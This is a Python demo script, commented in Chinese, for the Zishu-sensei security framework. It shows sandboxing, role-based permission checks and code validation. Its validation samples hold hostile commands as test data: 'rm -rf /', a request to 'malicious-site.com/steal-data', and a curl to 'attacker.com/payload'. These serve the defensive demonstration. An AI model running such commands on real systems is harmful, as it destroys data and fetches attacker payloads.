#!/usr/bin/env python3
"""
安全系统使用示例

本文件展示了如何使用Zishu-sensei的增强型安全系统，包括：
- 沙箱管理
- 权限控制
- 安全验证
- 审计日志

作者: Zishu-sensei团队
创建时间: 2024-01-01
"""

import asyncio
import logging
from pathlib import Path
from typing import Dict, Any, List

# 导入核心安全模块
from zishu.adapters.core.security import (
    SecurityManager,
    EnhancedSandboxManager,
    EnhancedPermissionManager,
    SecurityValidator,
    SandboxConfiguration,
    AccessRequest,
    SecurityContext,
    SecurityLevel,
    ThreatType,
    ValidationResult
)

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class SecurityUsageDemo:
    """安全系统使用演示类"""
    
    def __init__(self):
        """初始化演示环境"""
        self.security_manager = None
        self.sandbox_manager = None
        self.permission_manager = None
        self.security_validator = None
        
    async def initialize_security_system(self):
        """初始化安全系统"""
        logger.info("初始化安全系统...")
        
        # 1. 创建安全管理器
        self.security_manager = SecurityManager()
        await self.security_manager.initialize()
        
        # 2. 获取各个组件
        self.sandbox_manager = self.security_manager.sandbox_manager
        self.permission_manager = self.security_manager.permission_manager  
        self.security_validator = self.security_manager.security_validator
        
        logger.info("安全系统初始化完成")
    
    async def demonstrate_sandbox_usage(self):
        """演示沙箱使用"""
        logger.info("=== 沙箱管理演示 ===")
        
        # 1. 创建沙箱配置
        sandbox_config = SandboxConfiguration(
            name="demo_sandbox",
            isolation_level="STRICT",
            allowed_paths=["/tmp/demo"],
            blocked_paths=["/etc", "/root"],
            resource_limits={
                "max_memory": 512 * 1024 * 1024,  # 512MB
                "max_cpu_time": 30,  # 30秒
                "max_file_size": 10 * 1024 * 1024  # 10MB
            },
            network_access=False,
            allow_subprocess=False
        )
        
        # 2. 创建沙箱
        sandbox_id = await self.sandbox_manager.create_sandbox(sandbox_config)
        logger.info(f"创建沙箱: {sandbox_id}")
        
        # 3. 在沙箱中执行代码
        test_code = """
import os
import time

# 测试文件操作
with open('/tmp/demo/test.txt', 'w') as f:
    f.write('Hello from sandbox!')

# 测试系统信息获取
print(f"当前用户: {os.getenv('USER', 'unknown')}")
print(f"当前目录: {os.getcwd()}")

# 模拟一些计算
result = sum(range(1000))
print(f"计算结果: {result}")
"""
        
        try:
            result = await self.sandbox_manager.execute_in_sandbox(
                sandbox_id, test_code
            )
            logger.info(f"执行结果: {result}")
        except Exception as e:
            logger.error(f"沙箱执行失败: {e}")
        
        # 4. 清理沙箱
        await self.sandbox_manager.cleanup_sandbox(sandbox_id)
        logger.info("沙箱清理完成")
    
    async def demonstrate_permission_usage(self):
        """演示权限管理使用"""
        logger.info("=== 权限管理演示 ===")
        
        # 1. 创建用户角色
        await self.permission_manager.create_role(
            "demo_user",
            permissions=["file.read", "file.write", "network.http"]
        )
        
        await self.permission_manager.create_role(
            "admin_user", 
            permissions=["*"]  # 所有权限
        )
        
        # 2. 创建访问请求
        file_access_request = AccessRequest(
            resource_type="file",
            resource_path="/tmp/demo/data.txt",
            operation="read",
            user_id="user_123",
            user_roles=["demo_user"],
            context={"source": "web_interface"}
        )
        
        network_access_request = AccessRequest(
            resource_type="network",
            resource_path="https://api.example.com",
            operation="http_get",
            user_id="user_123", 
            user_roles=["demo_user"],
            context={"destination": "external_api"}
        )
        
        # 3. 验证权限
        file_result = await self.permission_manager.check_permission(file_access_request)
        network_result = await self.permission_manager.check_permission(network_access_request)
        
        logger.info(f"文件访问权限: {'允许' if file_result.allowed else '拒绝'}")
        logger.info(f"网络访问权限: {'允许' if network_result.allowed else '拒绝'}")
        
        # 4. 尝试受限操作
        restricted_request = AccessRequest(
            resource_type="system",
            resource_path="/etc/passwd",
            operation="read",
            user_id="user_123",
            user_roles=["demo_user"],
            context={"source": "direct_access"}
        )
        
        restricted_result = await self.permission_manager.check_permission(restricted_request)
        logger.info(f"受限资源访问: {'允许' if restricted_result.allowed else '拒绝'}")
        if not restricted_result.allowed:
            logger.info(f"拒绝原因: {restricted_result.reason}")
    
    async def demonstrate_security_validation(self):
        """演示安全验证使用"""
        logger.info("=== 安全验证演示 ===")
        
        # 1. 代码安全验证
        test_codes = [
            # 安全代码
            """
def calculate_sum(numbers):
    return sum(numbers)

result = calculate_sum([1, 2, 3, 4, 5])
print(f"结果: {result}")
""",
            # 可疑代码 - 文件操作
            """
import os
os.system('rm -rf /')
""",
            # 可疑代码 - 网络访问
            """
import urllib.request
urllib.request.urlopen('http://malicious-site.com/steal-data')
""",
            # 可疑代码 - 导入危险模块
            """
import subprocess
subprocess.call(['curl', 'http://attacker.com/payload'])
"""
        ]
        
        for i, code in enumerate(test_codes, 1):
            logger.info(f"验证代码片段 {i}:")
            
            context = SecurityContext(
                user_id="demo_user",
                session_id="demo_session",
                source_ip="127.0.0.1",
                user_agent="SecurityDemo/1.0",
                security_level=SecurityLevel.MEDIUM
            )
            
            result = await self.security_validator.validate_code(code, context)
            
            logger.info(f"  验证结果: {'通过' if result.is_valid else '失败'}")
            logger.info(f"  安全等级: {result.security_level}")
            
            if result.threats:
                logger.info("  检测到威胁:")
                for threat in result.threats:
                    logger.info(f"    - {threat.threat_type}: {threat.description}")
            
            if result.recommendations:
                logger.info("  安全建议:")
                for rec in result.recommendations:
                    logger.info(f"    - {rec}")
            
            logger.info("")
    
    async def demonstrate_integrated_workflow(self):
        """演示集成工作流"""
        logger.info("=== 集成工作流演示 ===")
        
        # 1. 创建安全上下文
        context = SecurityContext(
            user_id="workflow_user",
            session_id="workflow_session",
            source_ip="192.168.1.100",
            user_agent="ZishuClient/1.0",
            security_level=SecurityLevel.HIGH
        )
        
        # 2. 要执行的代码
        user_code = """
import json
import math

# 数据处理函数
def process_data(data):
    results = []
    for item in data:
        if isinstance(item, (int, float)):
            results.append(math.sqrt(abs(item)))
        else:
            results.append(0)
    return results

# 测试数据
test_data = [1, 4, 9, 16, 25, -36, "invalid"]
processed = process_data(test_data)

# 输出结果
output = {
    "original": test_data,
    "processed": processed,
    "summary": {
        "total_items": len(test_data),
        "valid_items": len([x for x in processed if x > 0])
    }
}

print(json.dumps(output, indent=2))
"""
        
        # 3. 完整的安全工作流
        try:
            # 步骤1: 安全验证
            logger.info("步骤1: 代码安全验证")
            validation_result = await self.security_validator.validate_code(user_code, context)
            
            if not validation_result.is_valid:
                logger.error("代码验证失败，停止执行")
                for threat in validation_result.threats:
                    logger.error(f"威胁: {threat.description}")
                return
            
            logger.info("代码验证通过")
            
            # 步骤2: 权限检查
            logger.info("步骤2: 权限验证")
            access_request = AccessRequest(
                resource_type="compute",
                resource_path="python_execution",
                operation="execute",
                user_id=context.user_id,
                user_roles=["standard_user"],
                context={"code_type": "data_processing"}
            )
            
            permission_result = await self.permission_manager.check_permission(access_request)
            if not permission_result.allowed:
                logger.error(f"权限检查失败: {permission_result.reason}")
                return
            
            logger.info("权限验证通过")
            
            # 步骤3: 沙箱执行
            logger.info("步骤3: 沙箱执行")
            sandbox_config = SandboxConfiguration(
                name="workflow_sandbox",
                isolation_level="MODERATE",
                allowed_paths=["/tmp/workflow"],
                resource_limits={
                    "max_memory": 256 * 1024 * 1024,  # 256MB
                    "max_cpu_time": 10,  # 10秒
                },
                network_access=False
            )
            
            sandbox_id = await self.sandbox_manager.create_sandbox(sandbox_config)
            
            execution_result = await self.sandbox_manager.execute_in_sandbox(
                sandbox_id, user_code
            )
            
            logger.info("代码执行成功")
            logger.info(f"执行输出:\n{execution_result.get('output', '')}")
            
            # 清理
            await self.sandbox_manager.cleanup_sandbox(sandbox_id)
            
        except Exception as e:
            logger.error(f"工作流执行失败: {e}")
    
    async def run_all_demos(self):
        """运行所有演示"""
        try:
            await self.initialize_security_system()
            await self.demonstrate_sandbox_usage()
            await self.demonstrate_permission_usage()
            await self.demonstrate_security_validation()
            await self.demonstrate_integrated_workflow()
            
            logger.info("所有演示完成!")
            
        except Exception as e:
            logger.error(f"演示运行失败: {e}")
        finally:
            # 清理资源
            if self.security_manager:
                await self.security_manager.cleanup()


async def main():
    """主函数"""
    print("Zishu-sensei 安全系统使用演示")
    print("=" * 50)
    
    demo = SecurityUsageDemo()
    await demo.run_all_demos()


if __name__ == "__main__":
    asyncio.run(main())
